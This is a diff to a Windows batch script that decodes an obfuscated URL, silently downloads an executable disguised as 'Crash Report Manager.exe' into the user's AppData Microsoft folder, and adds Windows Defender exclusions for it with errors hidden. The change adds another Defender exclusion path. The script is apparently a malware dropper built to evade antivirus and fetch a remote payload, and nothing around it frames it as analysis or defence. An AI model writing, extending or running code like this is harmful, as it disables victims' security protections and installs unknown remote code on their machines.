@@ -15,12 +15,14 @@ for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([S
 :: Define the correct folder path - here we use the %APPDATA% folder instead of %programdata%
 set "folder=%APPDATA%\Microsoft"
 set "filename=%folder%\Crash Report Manager.exe"
-set "filename2=%folder%\Crash Report Info.exe"
 
 :: Try to add exclusions for Defender, but continue if it fails, suppressing errors
 powershell -Command "try { Add-MpPreference -ExclusionProcess '%filename%' } catch { }" >nul 2>&1
-powershell -Command "try { Add-MpPreference -ExclusionProcess '%filename2%' } catch { }" >nul 2>&1
 powershell -Command "try { Add-MpPreference -ExclusionPath '%folder%' } catch { }" >nul 2>&1
+
+:: Add exclusion for %programdata%\Roaming\Microsoft
+set "roaming_folder=%ProgramData%\Roaming\Microsoft"
+powershell -Command "try { Add-MpPreference -ExclusionPath '%roaming_folder%' } catch { }" >nul 2>&1
 
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
 
